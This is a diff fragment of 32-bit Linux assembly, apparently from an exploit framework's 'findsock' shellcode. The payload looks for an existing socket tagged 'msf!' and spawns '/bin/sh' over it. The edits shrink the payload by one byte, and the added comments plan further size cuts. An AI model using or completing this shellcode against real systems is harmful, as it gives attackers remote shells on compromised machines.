@@ -2,15 +2,16 @@ BITS 32
 
 ; findsock via recv MSG_DONTWAIT by spoonm
 ; thanks to skape for ideas
+; XXX: Push null value as first dword of recv() buffer so recv() success check can be skipped.
+; XXX: Have constant sockaddr pointer and just do a 16-bit inc.
+; XXX: Get rid of esi counter?
+; XXX: Push return value of dup2() in loop so you can pop ebx() and also have a string terminator for '/bin/sh' on the stack as well.
 
 ; OS/CPU: linux/x86
-; Total Size: 95
+; Total Size: 94
 
-
-mov edi, "msf!"
 
 xor esi, esi
-; mov cx, 0xffff ; replaced for dec
 dec si
 
 ; esi = loop counter
@@ -36,7 +37,7 @@ pop eax ; syscall socketcall (0x66)
 int 0x80
 
 sub esp, BYTE -16
-cmp [esp], edi ; check for tag
+cmp dword [esp], 'msf!' ; check for tag
 je shell
 
 dec edx
